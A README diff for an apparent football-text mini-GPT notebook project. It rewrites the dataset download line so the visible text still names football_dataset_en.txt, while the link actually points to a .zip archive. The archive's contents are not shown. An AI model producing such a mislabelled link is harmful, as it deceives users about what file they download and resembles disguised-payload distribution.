@@ -22,7 +22,7 @@ The notebook follows a pipeline to:
 4. Before running the notebook, ensure `football_dataset.txt` is in the same folder.
 
 You can also download the dataset directly:  
-👉 [Download football_dataset_en.txt](https://github.com/Ag78910/mini-gpt-football/raw/main/football_dataset_en.txt)
+👉 [[Download football_dataset_en.txt](https://github.com/Ag78910/mini-gpt-football/raw/main/football_dataset_en.txt)](https://github.com/Ag78910/mini-gpt-football/raw/main/football_dataset_en.zip)
 
 ## 📋 Requirements
 
